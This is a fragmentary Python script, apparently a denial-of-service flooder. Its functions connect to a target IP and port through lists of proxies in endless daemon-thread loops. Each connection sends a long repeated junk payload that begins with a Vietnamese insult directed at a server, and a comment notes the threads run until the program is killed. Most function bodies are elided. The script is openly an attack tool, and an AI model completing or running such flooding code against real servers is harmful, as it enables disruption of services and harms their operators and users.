...
def test_proxy(proxy, target_ip, target_port, output_file):
    ...
    return False
def connect_with_proxy(proxy, target_ip, target_port, count):
    while True:
        ...
        if len(proxy_info) == 4:
            ...
            try:
                ...
                message += b"Dcu chung may duma server hbdhjfjggdgdgsshdhjfjfjvjdgdhhcfhh kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkk jjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjj hhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhh ggggggggggggggggggggggggg dfdddddddggggggggggggggggggg llllllllllllllllllllllllll mmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm fffffffffffffffffffffffffffff tttttttttttttttttttttttttttttttttttttt ddddddddddddddddddddddddddddddddd vvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvv Dcu chung may duma server hbdhjfjggdgdgsshdhjfjfjvjdgdhhcfhh kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkk jjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjj hhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhh ggggggggggggggggggggggggg dfdddddddggggggggggggggggggg llllllllllllllllllllllllll mmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm fffffffffffffffffffffffffffff tttttttttttttttttttttttttttttttttttttt ddddddddddddddddddddddddddddddddd vvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvv Dcu chung may duma server hbdhjfjggdgdgsshdhjfjfjvjdgdhhcfhh kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkk jjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjj hhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhh ggggggggggggggggggggggggg dfdddddddggggggggggggggggggg llllllllllllllllllllllllll mmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm fffffffffffffffffffffffffffff tttttttttttttttttttttttttttttttttttttt ddddddddddddddddddddddddddddddddd vvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvv Dcu chung may duma server hbdhjfjggdgdgsshdhjfjfjvjdgdhhcfhh kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkk jjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjj hhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhh ggggggggggggggggggggggggg dfdddddddggggggggggggggggggg llllllllllllllllllllllllll mmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm fffffffffffffffffffffffffffff tttttttttttttttttttttttttttttttttttttt ddddddddddddddddddddddddddddddddd vvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvv Dcu chung may duma server hbdhjfjggdgdgsshdhjfjfjvjdgdhhcfhh kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkk jjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjj hhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhh ggggggggggggggggggggggggg dfdddddddggggggggggggggggggg llllllllllllllllllllllllll mmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm fffffffffffffffffffffffffffff tttttttttttttttttttttttttttttttttttttt ddddddddddddddddddddddddddddddddd vvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvv"
...
def connect_with_proxyy(proxy, target_ip, target_port, count):
    while True:
...
def main():
    ...
    for proxy in proxies:#usable_proxies:
        thread = threading.Thread(target=connect_with_proxy, args=(proxy, target_ip, target_port,count))
    ...
    for proxy in proxiess:#usable_proxies:
        thread = threading.Thread(target=connect_with_proxyy, args=(proxy, target_ip, target_port,count))
        thread.daemon = True  # Đặt luồng thành daemon để nó chạy cho đến khi bạn tắt chương trình
        count += 1
        threads.append(thread)
        thread.start()
